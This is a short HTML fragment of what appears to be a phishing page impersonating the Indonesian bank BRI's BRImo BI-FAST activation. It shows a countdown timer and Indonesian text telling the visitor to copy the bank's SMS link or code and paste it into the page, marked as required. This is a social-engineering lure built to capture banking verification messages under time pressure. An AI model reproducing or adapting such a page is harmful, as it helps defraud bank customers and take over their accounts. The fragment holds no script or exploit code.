    ...
    <div class="container">
        <div class="box-lte">
            ...
            <div class="row">
                ...
                <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="timer">4  : 58</p>
            </div>
            <div class="row">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
                    <p style="font-size: 13px; text-align: center; font-weight: bold;">Link untuk aktivasi BRimo BIFAST telah kami kirim ke nomor handphone anda, silahkan di cek dan salin sms tautan lalu di tempel di bawah ini.<br><br>Tempel SMS BRI (Wajib).</p>
